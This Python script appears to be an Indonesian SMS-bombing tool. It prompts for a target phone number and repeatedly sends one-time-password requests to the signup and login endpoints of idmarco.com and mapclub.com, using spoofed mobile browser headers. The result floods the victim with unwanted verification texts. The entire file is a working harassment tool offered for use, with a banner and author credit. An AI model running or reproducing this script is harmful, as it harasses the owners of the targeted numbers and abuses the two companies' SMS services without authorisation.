

import os,sys,time,re,requests,json
from requests import post
from time import sleep
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro1(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)   
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    if r:
        print ("SUCCES MENGIRIM PESAN KE",no)    
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        print ("SUCCES MENGIRIM PESAN KE",no)
    else:
        print ("[!] GAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET")
        time.sleep(4)
        print ("[!] GAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET")
        time.sleep(4) 
        print ("[!] GAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET\n\n")
        time.sleep(1)
        sys.exit()
os.system("clear")
time.sleep(1)
kata("""\033[1;96m[!] Loading Cuk. . .
\033[1;96mOrang sabar disayang tuhan:)""")
time.sleep(10)

os.system("clear")
intro("""
\033[1;96m╔═╗\033[1;97m╦═╗╔═╗╔╦╗     \033[1;96m╔═╗\033[1;97m╔╦╗╔═╗
\033[1;96m╚═╗\033[1;97m╠═╝╠═╣║║║ <•> \033[1;96m╚═╗\033[1;97m║║║╚═╗
\033[1;96m╚═╝\033[1;97m╩  ╩ ╩╩ ╩     \033[1;96m╚═╝\033[1;97m╩ ╩╚═╝""")
intro1("""
\033[1;96m╔════════════════════════════════╗
\033[1;96m║\033[1;33m➢ \033[1;97mAuthor : \033[1;33mC4N_CyBer            \033[1;96m║
\033[1;96m║\033[1;33m➣ \033[1;97mYouTube: \033[1;33mCANDRA - NM          \033[1;96m║
\033[1;96m║\033[1;33m➢ \033[1;97mContoh : \033[1;33mGunakan +62          \033[1;96m║
\033[1;96m╚════════════════════════════════╝\n""")
time.sleep(1)
no = input("\033[1;33m [+] \033[1;97mMasukan No Target : \033[1;33m")
for i in range(1,4):
    sleep(1)
    marco()
    mapclub()
